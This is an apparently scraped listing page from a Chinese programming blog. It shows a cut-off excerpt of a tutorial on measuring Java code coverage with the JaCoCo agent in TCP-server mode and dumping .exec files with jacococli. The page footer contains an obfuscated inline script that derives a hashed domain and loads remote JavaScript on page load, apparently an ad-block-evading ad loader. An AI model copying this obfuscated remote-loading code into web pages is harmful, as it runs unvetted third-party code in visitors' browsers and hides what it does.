-javaagent:C:\工具\jacoco-0.8.6\lib\jacocoagent.jar=includes=*，这个参数就是启用jacoco代理参数，其中C:\工具\jacoco-0.8.6\lib\jacocoagent.jar就是之前下载jacoco解压后的jacocoagent.jar的绝对路径，includes表示对要插桩的包进行过滤，*代表所有的class都要进行插桩，也可以根据情况进行过滤，如includes=com.mycompany.*output=tcpserver，这里不需要改动，表示以TCP Server方式启动应用并插桩port=6300，Jacoco开启的TCP Server的端口，不能被占用address=localhost，对外开放的地址，也可以指定IP地址demo-0.0.1-SNAPSHOT.jar，就是示例代码构建后target目录生成的jar包，需要根据实际情况更新 执行后就会启动web服务，截图如下：
特别提醒：为了对比实时统计代码覆盖率的效果，此时请先不要请求上面提到的任何一个URL，切记！ dump生成覆盖率文件 保持服务启动，再打开一个cmd窗口同样cd到target目录，执行如下命令从上一步开启的TCP Server中dump出覆盖率文件
java -jar C:\工具\jacoco-0.8.6\lib\jacococli.jar dump --address localhost --port 6300 --destfile ./jacoco_tcp_01.exec 参数说明：
--destfile ./jacoco_tcp.exec，其中./jacoco_tcp.exec为生成exec文件名，表示在当前目录生成其他参数和上一步类似，不再特别说明，注意需要更新jacococli.jar的绝对路径 执行成功后，会在target目录生成相应的.exec文件
接下来，我们在浏览器中访问该web示例应用提供的两个
UR---http://127.0.0.1:8080/hello、http://127.0.0.1:8080/byebye，应用会调用相应的方法并正常返回结果。
然后，我们再次执行dump命令再生成一个.exec文件，命名为jacoco_tcp_02.exec
java -jar C:\工具\jacoco-0.8.6\lib\jacococli.jar dump --address localhost --port 6300 --destfile .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8c6cfaa81017a530205f438b11c1008/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/114/">«</a>
	<span class="pagination__item pagination__item--current">115/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/116/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>